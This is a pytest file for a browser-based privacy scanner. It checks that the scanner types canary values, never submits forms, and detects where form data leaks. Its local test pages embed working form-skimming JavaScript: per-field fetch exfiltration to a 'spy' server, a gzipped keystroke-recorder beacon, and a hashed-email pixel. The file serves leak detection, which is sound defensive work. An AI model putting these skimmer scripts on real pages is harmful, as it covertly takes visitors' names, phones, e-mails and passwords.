"""The form experiment in a real browser, against local pages: what it types, what it
never touches, and that no form is ever sent. Skipped without Playwright and a browser."""

import asyncio
import json
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest

from suveren import render
from suveren.checks import Status
from suveren.errors import ModuleError
from suveren.formleaks import PACKED, PLAIN, Canaries, find_leaks, run_form_leaks
from suveren.net import ALLOW_PRIVATE_ENV


@pytest.fixture(autouse=True)
def _local_sites(monkeypatch):
    # The test sites run on 127.0.0.1, which the browser refuses by default.
    monkeypatch.setenv(ALLOW_PRIVATE_ENV, "1")


pytest.importorskip("playwright")

PAGE = """<!doctype html><html><head><meta charset="utf-8"></head><body>
<form id="lead" action="/submit" method="post">
  <label for="n">Ваше имя</label><input id="n" name="fio">
  <input type="tel" name="phone" placeholder="+7 (___) ___-__-__">
  <input type="email" name="email">
  <input type="password" name="pass">
  <input name="card_number" autocomplete="cc-number">
  <input name="city" placeholder="Город">
  <button>Отправить</button>
</form>
<form role="search"><input name="q"></form>
<div style="display:none"><form><input type="tel" name="callback_phone"></form></div>
<form id="masked"><input type="tel" name="mobile" id="mobile"></form>
<script>
  const spy = 'http://127.0.0.1:{spy}';
  document.querySelectorAll('input').forEach((el) => el.addEventListener('blur', () => {
    fetch(spy + '/collect', {method: 'POST', body: JSON.stringify({n: el.name, v: el.value})});
  }));
  // A mask that only takes numbers starting with 9: it makes another number of ours.
  document.getElementById('mobile').addEventListener('input', (e) => {
    const d = e.target.value.replace(/\\D/g, '');
    e.target.value = d ? '+7 (9' + d.slice(1) : '';
  });
  // The page tries to send the form by itself, both ways.
  setTimeout(() => document.getElementById('lead').submit(), 300);
  setTimeout(() => document.getElementById('lead').requestSubmit(), 600);
</script></body></html>"""


class Server:
    def __init__(self, body: str = "") -> None:
        self.hits: list[tuple[str, str, bytes]] = []
        hits, page = self.hits, body.encode("utf-8")

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self) -> None:
                size = int(self.headers.get("Content-Length") or 0)
                hits.append((self.command, self.path, self.rfile.read(size) if size else b""))
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                if self.path == "/":
                    self.wfile.write(page)

            do_POST = do_GET

            def log_message(self, *args: object) -> None:
                pass

        self.httpd = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.port = self.httpd.server_address[1]
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()


def test_types_test_values_never_submits_and_finds_the_spy(monkeypatch):
    monkeypatch.setattr(render, "FORM_WATCH_MS", 1500)
    monkeypatch.setattr(render, "FORM_FLUSH_MS", 500)
    spy = Server()
    site = Server(PAGE.replace("{spy}", str(spy.port)))
    canaries = Canaries.new()

    async def run():
        async with render.BrowserSession(timeout=15) as session:
            return await session.fill_forms(
                f"http://localhost:{site.port}/", canaries.values(), settle_ms=1000
            )

    try:
        probe = asyncio.run(run())
    except ModuleError as exc:  # Playwright is installed, but no browser to drive
        pytest.skip(str(exc))
    try:
        by_name = {f["label"]: f for f in probe.filled}
        typed = {f["kind"]: f["value"] for f in probe.filled if f["value"]}
        # Name, phone, e-mail, password, the hidden pop-up's phone; the masked phone
        # came out as another number and was erased.
        assert by_name["Ваше имя"]["value"] == canaries.name
        assert typed["email"] == canaries.email and typed["password"] == canaries.password
        assert by_name["callback_phone"]["visible"] is False
        assert by_name["callback_phone"]["value"] == canaries.phone
        assert by_name["mobile"]["value"] == ""
        assert {f["label"] for f in probe.filled}.isdisjoint({"card_number", "Город", "q"})
        # The page tried to send the form twice; neither reached the server.
        assert probe.submits >= 2
        assert not [h for h in site.hits if h[1].startswith("/submit")]
        assert all(h[0] == "GET" for h in site.hits)
        leaks = {(x.kind, x.how) for x in find_leaks(probe, canaries)}
        assert {("name", PLAIN), ("phone", PLAIN), ("email", PLAIN), ("password", PLAIN)} <= leaks
        # The number the mask made was erased before the field was left: the page's
        # blur handler saw an empty field.
        reports = [json.loads(h[2]) for h in spy.hits if h[1] == "/collect"]
        assert [r["v"] for r in reports if r["n"] == "mobile"] == [""]
    finally:
        site.httpd.shutdown()
        spy.httpd.shutdown()


# A session recorder as they are usually built: key events buffered, gzipped
# (CompressionStream) and sent as a Blob beacon when the visitor leaves; an ad pixel that
# sends a SHA-256 of the e-mail in an image URL; a "lost lead" script that sends the phone
# to the site itself. Only the first two are third parties.
RECORDER = """<!doctype html><html><head><meta charset="utf-8"></head><body>
<form><input name="name" placeholder="Имя"><input type="tel" name="phone">
<input type="email" name="email"><button>Отправить</button></form>
<script>
  const spy = 'http://127.0.0.1:{spy}';
  const events = [];
  document.addEventListener('input', (e) => events.push({type: 3, data: {source: 5,
    id: e.target.name, text: e.target.value}}), true);
  document.addEventListener('visibilitychange', async () => {
    if (document.visibilityState !== 'hidden') return;
    const body = new Blob([JSON.stringify(events)]).stream()
      .pipeThrough(new CompressionStream('gzip'));
    navigator.sendBeacon(spy + '/rec', await new Response(body).blob());
  });
  document.querySelector('[name=email]').addEventListener('change', async (e) => {
    const h = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(e.target.value));
    const hex = [...new Uint8Array(h)].map((b) => b.toString(16).padStart(2, '0')).join('');
    new Image().src = spy + '/px?em=' + hex;
  });
  document.querySelector('[name=phone]').addEventListener('change', (e) => {
    fetch('/api/lost-lead', {method: 'POST', body: JSON.stringify({phone: e.target.value})});
  });
</script></body></html>"""


class NoNetwork:
    """A collector whose lookups fail: hosts outside the service base stay unclassified."""

    async def _host_infos(self, host: str) -> list[object]:
        raise OSError("offline")


def test_recorder_pixel_and_lost_lead_end_to_end(monkeypatch):
    monkeypatch.setattr(render, "FORM_WATCH_MS", 1500)
    monkeypatch.setattr(render, "FORM_FLUSH_MS", 1500)
    spy = Server()
    site = Server(RECORDER.replace("{spy}", str(spy.port)))
    url = f"http://localhost:{site.port}/"
    try:
        check, result, facts = asyncio.run(
            run_form_leaks([url], "localhost", NoNetwork(), timeout=15)
        )
    except ModuleError as exc:
        pytest.skip(str(exc))
    finally:
        site.httpd.shutdown()
        spy.httpd.shutdown()
    found = {(x.host, x.kind, x.how) for x in result.leaks}
    assert ("127.0.0.1", "email", PACKED) in found
    assert ("127.0.0.1", "name", PACKED) in found
    assert ("127.0.0.1", "email", "в виде хеша SHA-256") in found
    assert [(x.host, x.kind) for x in result.own] == [("localhost", "phone")]
    # An unknown recipient whose country is not known: a warning, not a failure.
    assert check.status is Status.WARN and check.id == "SUV-PD-012"
    assert "Сам сайт получает введённое" in check.details
    assert facts["leaks"][0]["foreign"] is None
